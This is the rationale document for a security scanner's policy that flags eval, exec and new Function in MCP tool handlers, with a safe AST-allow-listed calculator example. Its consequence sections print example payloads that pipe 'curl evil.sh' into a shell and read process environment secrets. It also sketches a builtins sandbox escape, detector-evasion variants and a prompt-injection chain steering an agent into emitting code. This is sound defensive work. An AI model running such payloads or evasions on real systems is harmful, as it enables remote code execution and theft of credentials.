---
policy_id: mcp_code_execution
category: mcp
topic: code_execution
rules:
  - id: MCP-009
    severity: high
    confidence: 0.85
    scope: tool
    fix_type: code
  - id: MCP-014
    severity: high
    confidence: 0.9
    scope: tool
    fix_type: code
references: [LLM05, LLM06]
---

# Policy Rationale: MCP Dynamic Code Execution

**Policy ID:** `mcp_code_execution`  
**File:** `mcp/code_execution.yaml`  
**Rules:** MCP-009, MCP-014  
**Severities:** high, high  
**Fix types:** code, code  
**References:** LLM05, LLM06

---

## What this policy covers

This policy targets MCP **tool handlers** whose body invokes a dynamic-code
primitive on a value derived from a tool parameter. An MCP tool handler is a
function registered with the Python MCP server APIs — `@server.tool`,
`@mcp.tool`, or `.register_tool` (FastMCP and the low-level SDK) — or the
TypeScript handler passed to an `McpServer` / `Server` `.registerTool(...)` /
`.tool(...)` call. Detection is the structured `has_code_exec_call` predicate.
For Python (MCP-009) it walks the handler AST and fires on any call whose callee
is the **bare builtin** `eval`, `exec`, or `compile`. For TypeScript (MCP-014)
it reads the `code_exec` body fact, which is stamped on exactly two AST shapes:
a `call_expression` whose callee text is exactly `eval`, and a `new_expression`
whose constructor identifier is exactly `Function` (`new Function(...)`). Because
both match the callee/constructor symbol rather than a substring, an attribute
call such as `re.compile(...)` (Python) or a member call like `obj.eval(...)`
(TypeScript) does not fire.

---

## Why dynamic code execution is a distinct concern in agent tools

A dynamic-code primitive in a tool body gives the model the runtime *itself* —
not the OS shell, but the Python interpreter or the Node/V8 runtime in which the
MCP server is executing: same memory, same imports, same in-process credentials,
same module-level singletons. There is no process boundary, no PID to kill from
outside, no `os.kill` that helps if the model writes a `while True` loop. The
server process has to die.

This is sharper for MCP than for an in-application SDK tool because of *who
controls the input and how far the trust gap stretches*. An MCP tool does not
run inside a request the developer can cancel. It runs inside a server invoked
by an **external orchestrator** — a Claude Desktop client, an IDE agent, another
team's agent loop — over stdio or HTTP, with the tool arguments produced by the
model from conversation context, frequently with **no human in the loop** on the
individual tool call. The argument passed to `eval`/`exec`/`compile` (Python) or
`eval`/`new Function` (TypeScript) is therefore **fully model-controlled**, and
the model may have been steered by an untrusted upstream document or a
prompt-injected task. The chain "untrusted document → prompt injection → model
emits an argument string → handler runs `exec(arg)`" is a single hop from a
malicious blog post to arbitrary code executing on the **MCP server host, with
the server's privileges** — and that server is commonly a long-lived process,
sometimes shared across multiple connecting clients, that the tool author and
the orchestrator operator do not jointly control.

The standard "I'll restrict globals" defense is known to be insufficient.
`exec(code, {"__builtins__": {}})` looks safe, but the `()` operator on any
reachable type reconstructs `__builtins__` via
`().__class__.__base__.__subclasses__()` chains; in TypeScript `new Function`
always closes over the global scope and `with({})`-style sandboxes are escapable
through `globalThis` and prototype chains. The CPython and V8 runtimes were not
designed as sandboxes. Because the MCP server holds state across calls, the blast
radius also outlives a single invocation: a model that gains code execution in
one call can rewrite the server's tool registry, swap function pointers, or stash
a long-lived callback that exfiltrates later prompts, with no per-call reset
unless the host explicitly forks a fresh worker — and most MCP servers do not.

---

## Rule-by-rule defense

### MCP-009 — Tool body calls eval/exec/compile on dynamic input (Severity: high, Confidence: 0.85, Fix type: code)

**What we detect:**
An MCP tool handler (registered via `@server.tool`, `@mcp.tool`, or
`.register_tool`) whose body calls the **bare builtin** `eval`, `exec`, or
`compile` (predicate `has_code_exec_call`, an AST call-node walk that matches the
callee symbol). The match is unconditional on the argument — we do not attempt to
prove the input string is model-supplied, since in an MCP tool the conservative
assumption is that any string parameter eventually is. An attribute call that
merely shares a name, such as `re.compile(...)`, is not matched because the
callee text is `re.compile`, not the bare `compile`.

**Why it is flaggable:**
`eval`/`exec`/`compile` interpret a string as Python and run it inside the MCP
server process. When any part of that string originates with the model — a tool
argument, or server-side state the model wrote on a prior call — the handler is
an arbitrary-code-execution surface with no process boundary and no sandbox
between the call and the runtime's imports, file handles, and in-memory
credentials. Even when the immediate argument looks constant, the presence of the
primitive signals a design choice to interpret strings as code, which the model
can usually reach later via a related parameter or a follow-up call.

**Real-world consequence:**
- A `calculate(expr: str)` "calculator" tool implemented as `eval(expr)` is
  driven by an injected instruction into
  `__import__('os').system('curl evil.sh | sh')` — pulling and running a remote
  payload on the server host — or into `__import__('os').environ` to read the
  process's secrets and any API keys held in memory.
- A `run_formula(formula)` tool that `exec`s a model-supplied snippet can open
  outbound sockets, read or write any file the server process can touch, or
  rewrite the server's own tool registry so later calls behave maliciously for
  every connected client.

**Why severity is high and not critical:**
The engine's severity scale tops out at `high`, so this rule sits at the ceiling
of the scale rather than a notional "critical" tier; the failure mode is
in-process arbitrary code execution with no partial mitigation, and there is no
"small" version of this bug. It is not weighted *above* the other high rules in
the pack because exploitation still requires model-controlled input actually
reaching the call — a handler that only ever `eval`s a hardcoded constant is
flagged but not exploitable. `medium` is reserved for issues that degrade output
or impose recoverable risk; this one removes the process boundary entirely, so
`high` is the correct (and maximal) classification.

**Fix type — code:**
Removing `eval`/`exec`/`compile`, or replacing it with `ast.literal_eval` / an
AST-allow-listed evaluator, requires editing the tool source. No MCP server
config, hook, or transport setting prevents an in-process call from executing
once the handler is dispatched.

**Confidence 0.85:**
The bare-builtin callee match eliminates the dominant false positive — the
`re.compile(...)` lookalike does **not** fire, because the predicate keys on the
callee symbol `compile`, not any callee whose text contains `compile`. A handler
that genuinely calls the `eval`/`exec`/`compile` builtins fires whether or not
the argument is constant; that fire-on-constant case is the one residual false
positive, and it is intentional under the conservative model-reachability
assumption (a constant today is a parameter tomorrow). The gap to 1.0 is
dominated by false negatives, not false positives: dynamic execution reached
through a helper defined in another module, or via `getattr(builtins, "ex" +
"ec")(s)`, `__import__("builtins").exec(...)`, or `types.FunctionType(...)`, uses
callees the body-only walk does not resolve. On the patterns the rule does
detect, the security verdict is rarely wrong, which is why confidence sits at
0.85 rather than lower.

### MCP-014 — TypeScript MCP tool evaluates dynamic code (Severity: high, Confidence: 0.9, Fix type: code)

**What we detect:**
A TypeScript MCP tool handler (the function passed to an `McpServer` / `Server`
`.registerTool(...)` / `.tool(...)` call) that calls the bare `eval()` builtin or
constructs `new Function(...)` (predicate `has_code_exec_call`, backed by the
structural `code_exec` fact in `ts_handler_facts.go`). The fact fires on two AST
shapes only: a `call_expression` whose callee text is exactly `eval`, and a
`new_expression` whose constructor identifier text is exactly `Function`. The
exact-callee match means a method named `retrieval(...)` or a member call like
`obj.eval(...)` does not fire — only the bare global `eval` and `new Function`.
This is the TypeScript analogue of the Python sibling
[MCP-009](#mcp-009--tool-body-calls-evalexeccompile-on-dynamic-input-severity-high-confidence-085-fix-type-code).

**Why it is flaggable:**
`eval` and `new Function` compile a string into executable JavaScript in the MCP
server's own Node process. When any part of that string originates with the
model — a tool argument, or server-side state the model wrote — the handler is an
arbitrary-code-execution surface with no SDK sandbox between the call and
`process.env`, the filesystem, the network (`fetch` and any in-memory
credentials), and the `require`/`import` graph.

**Real-world consequence:**
A `calculate(expr)` tool implemented as `return eval(expr)` is the canonical RCE
shape: an injected instruction steers the model to emit
`require('child_process').execSync('curl evil.sh | sh')` — running a remote
payload on the server host — or `process.env` to read the server's secrets. The
full Node runtime is reachable from a single evaluated string, and on a server
shared across clients the compromise persists for every later connection.

**Why severity is high and not critical:**
`high` is the top of the engine's severity scale, so this rule sits at that
ceiling rather than a separate "critical" tier. There is no in-band sandbox
between the evaluated string and the Node runtime; unlike Python there is not even
a partial `__builtins__`-stripping mitigation to reach for, since `new Function`
always closes over the global scope. The only reliable fix is removing dynamic
evaluation, so the gap is not partially mitigable. It is not weighted above the
other high rules because exploitation still requires model-controlled input
reaching the evaluated string — `high`, matching the Python sibling.

**Fix type — code:**
Removing `eval` / `new Function`, parsing structured input with `JSON.parse` and
dispatching on a fixed operation map, or isolating the evaluation in a
`worker_threads` worker / separate sandboxed process, is an edit to the tool's
own source.

**Confidence 0.9:**
Marginally higher than the Python sibling's 0.85. The structural `code_exec` fact
keys on the exact callee text `eval` and the exact constructor `Function`, so the
two dominant false positives are eliminated by construction: a same-named method
(`x.eval(...)`) and an unrelated identifier do not match, and unlike Python there
is no `re.compile`-style builtin name collision in TypeScript — which is precisely
why this rule sits above the Python rule. The residual gap is the false negative:
dynamic execution reached through an alias (`const e = eval; e(s)`), a property
access (`globalThis.eval`, `window.eval`), the `vm` module
(`vm.runInContext`, `vm.runInNewContext`, `new vm.Script(...)`),
`setTimeout("...string...", 0)`, or a code-exec helper in another module escapes
the handler-body-only walk. The fact also flags the presence of the primitive
without reasoning about whether the evaluated string is model-controlled, so a
provably-constant `eval` argument is a (rare, intentional) fire-on-safe-code case.

---

## What this policy does not cover

Write this section as the developer arguing the finding is a false positive — the
following dynamic-execution paths are real and equally dangerous, but escape the
predicate:

- **Indirect Python execution.** `getattr(builtins, "ex" + "ec")(s)`,
  `__import__("builtins").exec(...)`, and `types.FunctionType(compile(...), ...)`
  construct the callee dynamically, so the bare-builtin callee match in MCP-009
  does not resolve them.
- **Other Python dynamic-code primitives.** `pickle.loads(...)` and
  `marshal.loads(...)` on model-supplied bytes are deserialization-driven code
  execution; `importlib.import_module(model_supplied_name)` / `__import__` load an
  attacker-named module. None use `eval`/`exec`/`compile`, so none fire.
- **TypeScript paths outside the matched set (MCP-014).** `eval` reached through
  an alias (`const e = eval; e(s)`) or a property access (`globalThis.eval`,
  `window.eval`); the `vm` module (`vm.runInContext`, `vm.runInNewContext`,
  `new vm.Script(...)`); dynamic `import()` / `require` of attacker-named modules;
  and `setTimeout("...string...", 0)` string-form evaluation are all outside the
  two AST shapes the `code_exec` fact recognizes.
- **Cross-module helpers.** A dynamic-eval helper defined in another file and
  called from the handler escapes both rules, since the walk sees only the tool's
  own handler body.
- **Template / interpolation engines.** A server-side template engine
  (`jinja2`, `eval`-backed format strings, JS template-literal compilers) that
  evaluates model-supplied templates can be a code-execution surface without ever
  naming the matched callees.
- **Sandboxed or AST-gated evaluation.** RestrictedPython / `asteval`, or the
  AST-allow-listed pattern in *Recommendations* below, still call the `compile`
  and `eval` builtins, so they **fire the rule**. The rule flags the primitive;
  a reviewer confirms the gate makes the specific use safe. This is an accepted
  fire-on-safe-code case, not a bug — and the rule does not reason about whether
  the evaluated string is actually model-controlled, so a provably-constant
  argument also fires.

---

## Recommendations beyond the fix

For an MCP tool that needs to evaluate user arithmetic, validate the parsed AST
against an allow-list of node types before touching `compile`/`eval`, and never
evaluate a string that has not passed the gate:

```python
import ast
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("calculator")

_ALLOWED_NODES = (
    ast.Expression, ast.BinOp, ast.UnaryOp, ast.Constant,
    ast.Add, ast.Sub, ast.Mult, ast.Div, ast.FloorDiv, ast.Mod, ast.Pow,
    ast.USub, ast.UAdd,
)


@mcp.tool()
def evaluate_arithmetic(expression: str) -> dict:
    """Evaluate a numeric arithmetic expression. Only numeric literals and the
    operators + - * / // % ** are supported. Returns {result: number} or
    {error: str}."""
    try:
        tree = ast.parse(expression, mode="eval")
    except SyntaxError as exc:
        return {"error": f"syntax: {exc}"}

    for node in ast.walk(tree):
        if not isinstance(node, _ALLOWED_NODES):
            return {"error": f"disallowed node: {type(node).__name__}"}
        if isinstance(node, ast.Constant) and not isinstance(node.value, (int, float)):
            return {"error": "only numeric constants allowed"}

    return {"result": eval(compile(tree, "<expr>", "eval"))}
```

The TypeScript equivalent never constructs executable code from tool arguments —
it parses structured input with `JSON.parse` and dispatches on a fixed map of
allowed operations.

1. **Prefer `ast.literal_eval` (Python) / `JSON.parse` (TypeScript)** when the
   tool only needs to parse a literal value. Reach for an AST allow-list only
   when the tool genuinely must evaluate expressions, and never call `eval` on a
   string that has not been AST-validated.
2. **For "run model-generated code" surfaces** (code-interpreter style tools),
   spawn a separate, single-use process — `subprocess.Popen([...])` /
   `worker_threads` — with no network, a read-only root filesystem, a write-only
   `/workspace` bind mount, and hard CPU and wall-clock caps. Treat the worker as
   sacrificial; never evaluate in the MCP server process.
3. **Never reuse the server's `globals()` / live module objects** as the
   `globals` argument to `exec`, and in TypeScript never evaluate in a context
   that exposes `globalThis` — the chain back to `__builtins__` / the global
   scope is one attribute away.
4. **Keep application secrets out of the server process** that hosts any
   evaluation tool, so a successful exec cannot read API keys or session state
   from memory.
5. **Log every dynamic evaluation** with the input string and the connecting
   client/session identifier. An attacker who finds the primitive will probe
   variants; the audit log is how you discover the attempts.
